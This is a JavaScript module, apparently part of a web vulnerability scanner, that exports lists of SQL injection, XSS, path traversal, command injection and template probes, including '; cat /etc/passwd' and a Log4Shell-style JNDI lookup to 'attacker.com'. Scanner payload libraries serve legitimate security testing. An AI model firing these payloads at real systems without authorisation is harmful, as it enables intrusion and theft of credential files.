// Centralized payload library for scanner module

export const SQLI_PAYLOADS = [
  "' OR 1=1 --",
  "admin'--",
  "' UNION SELECT NULL--",
  "' OR 'a'='a",
  "' AND 1=1--",
  "' AND 1=2--",
  "') OR ('1'='1",
  "' OR sleep(5)--",
];

export const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  '"><img src=x onerror=alert(1)>',
  '">alert(1)',
  "<svg/onload=alert(1)>",
  "javascript:alert(1)",
];

export const PATH_TRAVERSAL_PAYLOADS = [
  "../../etc/passwd",
  "../../../windows/system32",
  "......\\boot.ini",
  "../../../../etc/shadow",
];

export const COMMAND_INJECTION_PAYLOADS = [
  "; ls",
  "&& whoami",
  "| id",
  "; cat /etc/passwd",
  "&& ipconfig",
];

export const SUSPICIOUS_PAYLOADS = [
  "${jndi:ldap://attacker.com/a}",
  "{{7*7}}",
  "{{config}}",
  "${7*7}",
];

export const ALL_PAYLOADS = {
  SQLi: SQLI_PAYLOADS,
  XSS: XSS_PAYLOADS,
  PathTraversal: PATH_TRAVERSAL_PAYLOADS,
  CommandInjection: COMMAND_INJECTION_PAYLOADS,
  Suspicious: SUSPICIOUS_PAYLOADS,
};

export const getPayloadsByType = (type) => {
  if (!type) return null;
  const key = String(type).toLowerCase();
  switch (key) {
    case 'sqli':
      return SQLI_PAYLOADS;
    case 'xss':
      return XSS_PAYLOADS;
    case 'pathtraversal':
    case 'path':
    case 'path_traversal':
      return PATH_TRAVERSAL_PAYLOADS;
    case 'commandinjection':
    case 'command':
      return COMMAND_INJECTION_PAYLOADS;
    case 'suspicious':
      return SUSPICIOUS_PAYLOADS;
    default:
      return null;
  }
};

export const getRandomPayload = (type) => {
  if (!type) {
    // pick from all payloads combined
    const concat = Object.values(ALL_PAYLOADS).flat();
    return concat[Math.floor(Math.random() * concat.length)];
  }
  const list = getPayloadsByType(type);
  if (!list || list.length === 0) return null;
  return list[Math.floor(Math.random() * list.length)];
};

export const getAllPayloads = () => ({ ...ALL_PAYLOADS });

export default ALL_PAYLOADS;
